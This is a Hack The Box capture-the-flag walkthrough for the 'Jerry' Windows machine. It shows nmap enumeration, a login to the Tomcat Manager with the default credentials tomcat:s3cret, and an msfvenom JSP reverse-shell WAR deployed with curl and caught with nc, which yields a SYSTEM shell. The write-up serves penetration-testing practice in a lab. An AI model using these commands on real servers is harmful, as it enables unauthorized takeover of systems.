# Jerry — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Windows |
| **Difficulty** | Easy |

| **IP** | `10.129.82.176` |
## Synopsis

Jerry is an easy Windows machine and one of the most straightforward boxes on the platform.
It runs **Apache Tomcat** with the **Manager** application exposed and protected only by
**default credentials** (`tomcat:s3cret`). Those credentials allow deploying a malicious
**WAR** file, which executes as the Tomcat service account — here **NT AUTHORITY\SYSTEM** —
giving full compromise in a single step. Both the user and root flags are stored together in
one file on the Administrator desktop.

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate=5000 -T4 10.129.82.176
nmap -p8080 -sCV 10.129.82.176
```

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

### Tomcat Manager

Browsing `http://10.129.82.176:8080/` shows the default Tomcat landing page. The **Manager App**
(`/manager/html`) prompts for HTTP Basic auth. Trying Tomcat's well-known default credentials
works:

```
tomcat : s3cret
```

(The same pair is also exposed in the `401` error page's example `tomcat-users.xml` snippet.)

---

## Foothold & Privilege Escalation — malicious WAR deployment

Tomcat Manager allows uploading and deploying web applications. Generate a reverse-shell WAR:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f war -o shell.war
```

Start a listener and deploy the WAR through the Manager (upload `shell.war` under
*WAR file to deploy*, or via `curl`):

```bash
curl -u 'tomcat:s3cret' --upload-file shell.war \
  "http://10.129.82.176:8080/manager/text/deploy?path=/shell"
nc -lvnp 4444
```

Request the deployed app to trigger the payload:

```bash
curl "http://10.129.82.176:8080/shell/"
```

Because the Tomcat service runs as **SYSTEM**, the reverse shell is already fully privileged —
no further escalation needed:

```
C:\apache-tomcat-7.0.88> whoami
nt authority\system
```

### Flags

Both flags are stored in a single file:

```
C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
```

```
type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
```

